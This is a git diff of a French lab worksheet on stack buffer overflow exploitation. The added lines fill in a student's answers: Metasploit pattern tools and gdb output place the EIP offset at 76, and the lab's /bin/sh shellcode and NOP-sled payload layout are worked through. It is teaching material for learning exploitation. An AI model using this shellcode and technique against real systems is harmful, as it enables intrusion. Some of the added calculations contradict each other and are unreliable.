@@ -219,21 +219,37 @@ gdb ./vuln1
 ```
 
 ### 3.2 Observation de l'état de la pile
-
-**Question 3.2.1** : Exécutez le programme avec un argument de 78 caractères :
+Generer un chaine aleatoire pour trouver offset de EIP: taillebuffer+ 4(EBP)+4(EIP)=80 caracteres
 ```bash
-(gdb) run $(perl -e 'print "A"x78')
+┌──(kali㉿kali)-[~]
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 80    
 ```
 
-### 3.2 Observation de l'état de la pile
-
-**Question 3.2.1** : Exécutez le programme avec un argument de 78 caractères :
+**Question 3.2.1** : Exécutez le programme avec un argument de 80 caractères :
 ```bash
-(gdb) run $(perl -e 'print "A"x78')
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
 ```
 
-**Question 3.2.2** : À chaque breakpoint, observez :
+**Question 3.2.2** : À chaque breakpoint, observez pour recuperer le chevauchement dans EIP:
+```bash
+(gdb) nexti
+(gdb) info frame
+Stack level 0, frame at 0xffffcfa0:
+ eip = 0x80491a7 in func (vuln1.c:8); saved **eip = 0x63413563**
+ called by frame at 0xffffcfa4
+ source language c.
+ Arglist at 0xffffcf98, args: arg=0xffffd200 ";\322\377\377\032"
+ Locals at 0xffffcf98, Previous frame's sp is 0xffffcfa0
+ Saved registers:
+  ebx at 0xffffcf94, ebp at 0xffffcf98, eip at 0xffffcf9c
+```
 
+```bash
+┌──(kali㉿kali)-[~]
+└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 63413563        
+[*] Exact match at offset 76
+
+```
 **Schéma de référence - État de la pile pendant l'exécution :**
 ```
 Breakpoint 1 (avant call func) :
@@ -285,12 +301,13 @@ ESP → └─────────────────┘ ← 0xbffffbf0
 
 **Points clés à observer :**
 - **Adresse du buffer** : EBP - 0x48 = début du buffer  
-- **Taille réelle** : 0x58 (88) octets alloués par le compilateur
+- **Taille réelle** : 0x48 (64) octets alloués par le compilateur
 - **Décalage EIP** : 76 octets pour atteindre l'adresse de retour
-- **Écrasement** : Nos 78 'A' écrasent EBP et 2 octets d'EIP
+- **Écrasement** : Nos 80 écrasent EBP et 2 octets d'EIP
+- **Padding** : padding = offset_ret - (taille_NOP + taille_shellcode)
 
 **Question 3.2.3** : Identifiez précisément :
-- L'adresse de début du buffer
+- L'adresse de début du buffer : print &buffer
 - L'adresse de la sauvegarde d'EBP
 - L'adresse de la sauvegarde d'EIP
 - Le décalage nécessaire pour écraser EIP
@@ -314,16 +331,26 @@ Le shellcode suivant ouvre un shell :
 ```
 \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
 ```
-
+Calculer la taille du shellcode
+```python
+shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+print(len(shellcode))
+```
 **Question 4.1.1** : Quelle est la taille de ce shellcode ?
 
 **Question 4.1.2** : Ce shellcode peut-il tenir dans votre buffer ? Justifiez.
 
 ### 4.2 Construction du payload
 
-### 4.2 Construction du payload
-
 **Question 4.2.1** : Construisez votre payload selon le schéma :
+Récapitulatif :
+- Taille NOP sled : n
+
+- Taille shellcode : 45
+
+- Offset total avant EIP (ret addr) : 76 (d’après pattern_offset)
+
+- Padding = 76 - n - 45 = 15
 
 **Schéma 4 : Payload pour exploitation - Cas 1 (Buffer suffisant)**
 ```
@@ -396,7 +423,7 @@ perl -e 'print "\x90"x[NB_NOPS] . "[SHELLCODE]" . "[ADRESSE]"'
 ```bash
 ./vuln1 $(perl -e 'print "[VOTRE_PAYLOAD]"')
 ```
-
+remplacer l'addresse de buffer (de debut) s'il le faut
 ---
 
 ## Partie V : Exploitation - Cas 2 (Buffer insuffisant) (90 min)
